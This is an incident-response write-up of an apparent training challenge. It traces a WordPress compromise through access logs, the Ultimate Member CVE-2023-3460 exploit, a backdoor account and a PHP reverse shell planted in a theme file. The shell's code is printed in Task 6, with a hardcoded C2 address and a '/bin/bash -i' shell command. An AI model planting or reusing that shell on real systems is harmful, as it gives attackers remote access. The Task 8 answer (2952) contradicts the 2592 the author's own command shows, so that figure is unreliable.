# Ultimatum

#linux #log_analysis 
## Description

One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believe this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.
## Files

```powershell
➜ tree /a /f 
C:.
|   ip-172-31-11-131-20230808-0937-console-error-log.txt
|
+---Docker
+---Logs
|       ip-172-31-11-131-20230808-0937-last-btmp.txt
|       ip-172-31-11-131-20230808-0937-last-utmp.txt
|       ip-172-31-11-131-20230808-0937-last-utmpdump.txt
|       ip-172-31-11-131-20230808-0937-last-wtmp.txt
|       ip-172-31-11-131-20230808-0937-lastlog.txt
|       ip-172-31-11-131-20230808-0937-passwd-check.txt
|       ip-172-31-11-131-20230808-0937-var-crash-list.txt
|       ip-172-31-11-131-20230808-0937-var-crash.tar.gz
|       ip-172-31-11-131-20230808-0937-var-log-list.txt
|       ip-172-31-11-131-20230808-0937-var-log.tar.gz
|       ip-172-31-11-131-20230808-0937-who.txt
|       ip-172-31-11-131-20230808-0937-whoandwhat.txt
|
+---Misc
|       ip-172-31-11-131-20230808-0937-dev-dir-files-hashes.txt
|       ip-172-31-11-131-20230808-0937-dev-dir-files.txt
|       ip-172-31-11-131-20230808-0937-exec-perm-files.txt
|       ip-172-31-11-131-20230808-0937-full-timeline.csv
|       ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt
|       ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt
|       ip-172-31-11-131-20230808-0937-Setuid-Setguid-tools.txt
|
+---Persistence
|       ip-172-31-11-131-20230808-0937-cron-folder-list.txt
|       ip-172-31-11-131-20230808-0937-cron-folder.tar.gz
|       ip-172-31-11-131-20230808-0937-cron-tab-list.txt
|       ip-172-31-11-131-20230808-0937-persistence-systemdlist.txt
|       ip-172-31-11-131-20230808-0937-service_status.txt
|       ip-172-31-11-131-20230808-0937-systemctl_all.txt
|       ip-172-31-11-131-20230808-0937-systemctl_service_status.txt
|
+---Podman
+---Process_and_Network
|       ip-172-31-11-131-20230808-0937-ip-a.txt
|       ip-172-31-11-131-20230808-0937-iptables-numerical.txt
|       ip-172-31-11-131-20230808-0937-iptables.txt
|       ip-172-31-11-131-20230808-0937-lsof-list-open-files.txt
|       ip-172-31-11-131-20230808-0937-process-cmdline.txt
|       ip-172-31-11-131-20230808-0937-process-details.txt
|       ip-172-31-11-131-20230808-0937-process-environment.txt
|       ip-172-31-11-131-20230808-0937-process-exe-links.txt
|       ip-172-31-11-131-20230808-0937-process-fd-links.txt
|       ip-172-31-11-131-20230808-0937-process-map_files-link-hashes.txt
|       ip-172-31-11-131-20230808-0937-process-map_files-links.txt
|       ip-172-31-11-131-20230808-0937-processes-axwwSo.txt
|       ip-172-31-11-131-20230808-0937-processhashes.txt
|       ip-172-31-11-131-20230808-0937-routetable.txt
|       ip-172-31-11-131-20230808-0937-ss-anepo.txt
|       ip-172-31-11-131-20230808-0937-ssh-folders-list.txt
|       ip-172-31-11-131-20230808-0937-ssh-folders.tar.gz
|
+---System_Info
|       ip-172-31-11-131-20230808-0937-cpuinfo.txt
|       ip-172-31-11-131-20230808-0937-deb-package-verify.txt
|       ip-172-31-11-131-20230808-0937-deb-packages.txt
|       ip-172-31-11-131-20230808-0937-df.txt
|       ip-172-31-11-131-20230808-0937-dmesg.txt
|       ip-172-31-11-131-20230808-0937-etc-key-files-list.txt
|       ip-172-31-11-131-20230808-0937-etc-modified-files-list.txt
|       ip-172-31-11-131-20230808-0937-etc-modified-files.tar.gz
|       ip-172-31-11-131-20230808-0937-host-date-timezone.txt
|       ip-172-31-11-131-20230808-0937-lsmod.txt
|       ip-172-31-11-131-20230808-0937-lsusb.txt
|       ip-172-31-11-131-20230808-0937-meminfo.txt
|       ip-172-31-11-131-20230808-0937-modinfo.txt
|       ip-172-31-11-131-20230808-0937-module-sha1.txt
|       ip-172-31-11-131-20230808-0937-mount.txt
|       ip-172-31-11-131-20230808-0937-procmod.txt
|       ip-172-31-11-131-20230808-0937-release.txt
|       ip-172-31-11-131-20230808-0937-sudo.txt
|
+---User_Files
|       hidden-user-home-dir-list.txt
|       hidden-user-home-dir.tar.gz
|
\---Virsh

└─$ cat ip-172-31-11-131-20230808-0937-var-log-list.txt
/var/log/
/var/log/auth.log
/var/log/dbconfig-common/
/var/log/dbconfig-common/dbc.log
/var/log/cloud-init.log
/var/log/syslog.5.gz
/var/log/auth.log.2.gz
/var/log/cloud-init-output.log
/var/log/ubuntu-advantage.log
/var/log/ubuntu-advantage-timer.log
/var/log/syslog.3.gz
/var/log/kern.log
/var/log/btmp.1
/var/log/dpkg.log.1
/var/log/landscape/
/var/log/landscape/sysinfo.log
/var/log/syslog.4.gz
/var/log/syslog.1
/var/log/journal/
/var/log/journal/67fd13305f3e436fb4fa786ce9ab4cce/
/var/log/journal/67fd13305f3e436fb4fa786ce9ab4cce/user-1000.journal
/var/log/journal/67fd13305f3e436fb4fa786ce9ab4cce/system.journal
/var/log/dmesg
/var/log/apt/
/var/log/apt/term.log
/var/log/apt/eipp.log.xz
/var/log/apt/term.log.1.gz
/var/log/apt/history.log
/var/log/apt/history.log.1.gz
/var/log/ubuntu-advantage.log.1
/var/log/auth.log.4.gz
/var/log/auth.log.1
/var/log/ubuntu-advantage-timer.log.1
/var/log/syslog.2.gz
/var/log/mysql/
/var/log/mysql/error.log
/var/log/mysql/error.log.4.gz
/var/log/mysql/error.log.2.gz
/var/log/mysql/error.log.6.gz
/var/log/mysql/error.log.7.gz
/var/log/mysql/error.log.1.gz
/var/log/mysql/error.log.3.gz
/var/log/mysql/error.log.5.gz
/var/log/auth.log.3.gz
/var/log/apache2/
/var/log/apache2/access.log.7.gz
/var/log/apache2/error.log.13.gz
/var/log/apache2/error.log
/var/log/apache2/access.log.12.gz
/var/log/apache2/error.log.4.gz
/var/log/apache2/access.log.6.gz
/var/log/apache2/access.log.13.gz
/var/log/apache2/access.log.8.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/access.log
/var/log/apache2/access.log.10.gz
/var/log/apache2/error.log.6.gz
/var/log/apache2/access.log.4.gz
/var/log/apache2/error.log.1
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/error.log.9.gz
/var/log/apache2/error.log.10.gz
/var/log/apache2/access.log.3.gz
/var/log/apache2/error.log.8.gz
/var/log/apache2/access.log.1
/var/log/apache2/error.log.7.gz
/var/log/apache2/error.log.14.gz
/var/log/apache2/access.log.14.gz
/var/log/apache2/access.log.9.gz
/var/log/apache2/error.log.11.gz
/var/log/apache2/error.log.3.gz
/var/log/apache2/error.log.12.gz
/var/log/apache2/error.log.5.gz
/var/log/apache2/access.log.5.gz
/var/log/apache2/access.log.2.gz
/var/log/apache2/access.log.11.gz
/var/log/btmp
/var/log/amazon/
/var/log/amazon/ssm/
/var/log/amazon/ssm/hibernate.log
/var/log/amazon/ssm/audits/
/var/log/amazon/ssm/audits/amazon-ssm-agent-audit-2023-07-12
/var/log/amazon/ssm/amazon-ssm-agent.log
/var/log/unattended-upgrades/
/var/log/unattended-upgrades/unattended-upgrades-shutdown.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades.log.1.gz
/var/log/unattended-upgrades/unattended-upgrades.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
/var/log/alternatives.log.1
/var/log/syslog
/var/log/wtmp
/var/log/dpkg.log
/var/log/lastlog
/var/log/alternatives.log
/var/log/dist-upgrade/
/var/log/kern.log.1
/var/log/syslog.6.gz
/var/log/syslog.7.gz
/var/log/private/

┌──(woyag㉿kraken)-[/media/…/catscale_out/Logs/var/log]
└─$ tar -xzvf ip-172-31-11-131-20230808-0937-var-log.tar.gz
```

> Password: `hacktheblue`

## Tasks

### Task 1. Which security scanning tool was utilized by the attacker to fingerprint the blog website?

To parse and display only the `User-Agent` headers from the given log entries without including the quotes, you can use the following command: `grep -oP '(?<=")[^"]+(?="$)' access.log`
- **`-o`**: Print only the matching part of the lines.
- **`-P`**: Use Perl-compatible regular expressions (PCRE).
- **`(?<=")[^"]+(?="$)`**: The regular expression pattern to match the `User-Agent` strings without the enclosing quotes.
	- **`(?<=")`**: Positive lookbehind assertion. Ensures that the match is preceded by a quote (`"`), but the quote itself is not included in the match.
	- **`[^"]+`**: Matches any sequence of characters except the quote.
	- **`(?="$)`**: Positive lookahead assertion. Ensures that the match is followed by a quote (`"`) at the end of the line, but the quote itself is not included in the match.

```bash
┌──(woyag㉿kraken)-[/media/…/Logs/var/log/apache2]
┌──(woyag㉿kraken)-[/media/…/Logs/var/log/apache2]
└─$ grep -oP '(?<=")[^"]+(?="$)' access.log | sort | uniq -c | sort -nr | bat
───────┬────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼────────────────────────────────────────────────────────────────────────────────
   1   │    2201 WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)
   2   │     457 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
   3   │      98 Apache/2.4.41 (Ubuntu) (internal dummy connection)
   4   │       4 WordPress/6.2.2; http://3.110.136.25
   5   │       4 Secragon Offensive Agent
   6   │       2 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
   7   │       2 Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
   8   │       2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
   9   │       2 Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from o
       │ ur scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com
  10   │       1 python-requests/2.31.0
  11   │       1 python-requests/2.28.1
  12   │       1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
  13   │       1 Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
  14   │       1 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
  15   │       1 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
  16   │       1 Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
  17   │       1 Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
  18   │       1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
  19   │       1 Hello, world
  20   │       1 curl/7.88.1
  21   │       1 -
───────┼────────────────────────────────────────────────────────────────────────────────
```

::: tip :bulb: Answer
`wpscan/3.8.24`
:::

### Task 2. Which CVE was exploited by the attacker?

In the headers we saw `Secragon Offensive Agent` header, specific header like this stands out. If we check for CVE's we find 2 [CVE-2023-3460](https://github.com/gbrsh/CVE-2023-3460) and [CVE-2023-28121](https://github.com/gbrsh/CVE-2023-28121).

I used this program to parse the logs: [Apache-Access-Log-to-CSV-Converter](https://github.com/mboynes/Apache-Access-Log-to-CSV-Converter) and opened the csv in TimelineExplorer
```bash
└─$ php apache_log_to_csv_converter.php ./access.log ./access.log.csv
```

![Writeup.png](/assets/soc/sherlocks/ultimatum/Writeup.png)

In the `Path` column we see version of `ultimate-member` which is `2.6.4`. Checking the 3460 CVE [Hacking Campaign Actively Exploiting Ultimate Member Plugin](https://wpscan.com/blog/hacking-campaign-actively-exploiting-ultimate-member-plugin/) => `Versions lower than 2.6.7`

::: tip :bulb: Answer
`CVE-2023-3460`
:::

### Task 3. What was the IP Address utilized by the attacker to exploit the CVE?

```bash
┌──(woyag㉿kraken)-[/media/…/Logs/var/log/apache2]
└─$ grep 'Secragon Offensive Agent' access.log | bat
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "GET //index.php/register/ HTTP/1.1" 301 295 "-" "Secragon Offensive Agent"
   2   │ 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "GET /index.php/register/ HTTP/1.1" 200 11367 "-" "Secragon Offensive Agent"
   3   │ 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "POST //index.php/register/ HTTP/1.1" 302 951 "-" "Secragon Offensive Agent"
   4   │ 23.106.60.163 - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/secragon/ HTTP/1.1" 200 14335 "-" "Seragcon Offensive Agent"
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

::: tip :bulb: Answer
`23.106.60.163`
:::

### Task 4. What is the name of the backdoor user added to the blog as part of the exploitation process?

The question is asking about which user got added by the exploit and in the logs we see 
```bash
   4   │ 23.106.60.163 - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/secragon/ HTTP/1.1" 200 14335 "-" "Seragcon Offensive Agent"
```

::: tip :bulb: Answer
`secragon`
:::

### Task 5. After the exploit, the SOC team observed that the attacker's IP address changed and from the logs, it seems that the attacker manually explored the website after logging in. The SOC team believes that the previous IP seen during exploitation was a public cloud IP. What is the IP Address the attacker used after logging in to the site?

The most repeated IP in the logs after WordPress exploit is `198.16.74.45`. During manual exploration webserver loads different files which are required to render everything nicely so it's another indicator that this was the user IP who browser the blog after.
```bash
└─$ grep 'Secragon Offensive Agent' access.log -A1000000 | awk '{print($1)}' | sort | uniq -c | sort -nr | head
    426 198.16.74.45
     97 ::1
     19 198.16.76.68
     10 50.7.93.28
      7 212.224.107.86
      4 23.106.60.163
      3 3.110.136.25
      2 162.216.150.173
      1 62.212.64.17
      1 45.79.181.104
```

::: tip :bulb: Answer
`198.16.74.45`
:::

### Task 6. The SOC team has suspicions that the attacker added a web shell for persistent access. Confirm the full path of the web shell on the server.

Since the given filesystem is Linux, we should look for shell. Most common stable shell is `bash` and after searching webshell file we find `pentestmonkey/php-reverse-shell`
```bash
└─$ grep '/bin/bash' ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt -B12
==> /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '43.204.24.76';
$port = 6969;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
```

::: tip :bulb: Answer
`/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php`
:::

### Task 7. What was the value of the $shell variable in the web shell?

The answer wanted specific format... so anything after equals and space...

::: tip :bulb: Answer
`'uname -a; w; id; /bin/bash -i';`
:::

### Task 8. What is the size of the webshell in bytes?

Get lines indexes:
```bash
└─$ grep '==>' ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt -n | grep hidden-comments -A1
323607:==> /root/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
323666:==> /root/wordpress/wp-content/themes/twentytwentythree/patterns/post-meta.php <==
--
656375:==> /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
656492:==> /var/www/html/wp-content/themes/twentytwentythree/patterns/post-meta.php <==
```

Extract lines using `sed`. Start and end index is included so increment/decrement by 1. Also because of file format you should also decrement index by 1 to not include newline of log file. 
```
==> /path/to/file <==
file
contents
yada yada
NEWLINE
==> /path/to/other/file <==
...
```

Pipe lines to `wc` and get character count.
```bash
└─$ sed -n '656376,656490p' ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt | wc -c
2592
```

::: tip :bulb: Answer
`2952`
:::

### Task 9. The SOC team believes that the attacker utilized the webshell to get RCE on the server. Can you confirm the C2 IP and Port?

Variables are hardcoded in webshell.

::: tip :bulb: Answer
`43.204.24.76:6969`
:::

### Task 10. What is the process ID of the process which enabled the Threat Actor (TA) to gain hands-on access to the server?

The relevant information can be found in `ss` command output:
```bash
└─$ cat ip-172-31-11-131-20230808-0937-ss-anepo.txt | grep 6969
tcp    ESTAB       0       0                                      172.31.11.131:60380                                          43.204.24.76:6969                 users:(("bash",pid=234521,fd=12),("sh",pid=234517,fd=12),("apache2",pid=234471,fd=12)) uid:33 ino:1532880 sk:b <->
```

::: tip :bulb: Answer
`234521`
:::

### Task 11. What is the name of the script/tool utilized as part of internal enumeration and finding privilege escalation paths on the server?

Since the user has not escalated the privilege we can filter for `www-data` user in log file `./Misc/ip-172-31-11-131-20230808-0937-full-timeline.csv`

![Writeup-1.png](/assets/soc/sherlocks/ultimatum/Writeup-1.png)

**[LinEnum](https://github.com/rebootuser/LinEnum)**

::: tip :bulb: Answer
`LinEnum.sh`
:::